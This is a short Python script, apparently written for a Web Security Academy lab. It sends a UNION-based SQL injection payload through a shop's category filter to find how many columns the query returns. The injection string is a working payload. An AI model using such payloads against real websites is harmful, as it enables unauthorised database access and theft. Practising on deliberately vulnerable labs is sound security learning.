import requests

site = 'ac3f1f3b1e4686c4c0196f8f00cc00ae.web-security-academy.net'

if __name__ == "__main__":
    def try_category(category_string):
        url = f'https://{site}/filter?category={category_string}'
        resp = s.get(url)
        print(resp.text)


    s = requests.Session()
    try_category("""Gifts' UNION SELECT null,null,null -- """)
    # use ' to end previous SQL statement in website backend. Then UNION a table with  null for each column value, but
    # so that we can tell if the UNION is successful and returned or errored (hinting at different number of columns)
